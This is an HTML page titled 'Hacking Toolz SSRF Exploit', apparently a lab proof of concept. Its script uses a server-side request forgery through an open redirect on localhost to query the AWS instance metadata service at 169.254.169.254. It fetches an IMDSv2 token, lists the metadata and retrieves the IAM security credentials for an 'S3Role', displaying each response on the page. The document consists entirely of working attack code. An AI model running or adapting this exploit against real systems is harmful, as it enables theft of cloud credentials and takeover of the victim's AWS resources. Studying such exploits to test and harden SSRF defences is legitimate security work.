<html>
    <h1>Hacking Toolz SSRF Exploit</h1>
    <div id="tokenResponse"></div>
    <div id="metadataResponse"></div>
    <div id="credentialsResponse"></div>
    <div id="error"></div>
    <script>
        var tokenUrl = "http://localhost/redir.php?url=http://169.254.169.254/latest/api/token";
        var metadataURL = "http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/";
        var credentialsURL = "http://localhost/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role";
        var xhr = new XMLHttpRequest();
        var token = '';
        
        try {
            // Step 1: Get AWS IMSv2 token
            xhr.open('PUT', tokenUrl, false);
            xhr.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
            xhr.send();
            token = xhr.responseText;
            document.getElementById("tokenResponse").innerHTML = "<h3>Token Response:</h3><pre>" + token + "</pre>";

            // Step 2: Get metadata directory listing
            xhr.open('GET', metadataURL, false);
            xhr.setRequestHeader('X-aws-ec2-metadata-token', token);
            xhr.send();
            document.getElementById("metadataResponse").innerHTML = "<h3>Metadata Response:</h3><pre>" + xhr.responseText + "</pre>";
            
            // Step 3: Get S3 credentials directly
            xhr.open('GET', credentialsURL, false);
            xhr.setRequestHeader('X-aws-ec2-metadata-token', token);
            xhr.send();
            document.getElementById("credentialsResponse").innerHTML = "<h3>S3 Credentials:</h3><pre style='word-wrap: break-word; white-space: pre-wrap;'>" + xhr.responseText + "</pre>";
            
        } catch(err) {
            document.getElementById('error').innerHTML = "<h3>Error:</h3><pre>" + err.message + "</pre>";
        }
    </script>
</html>
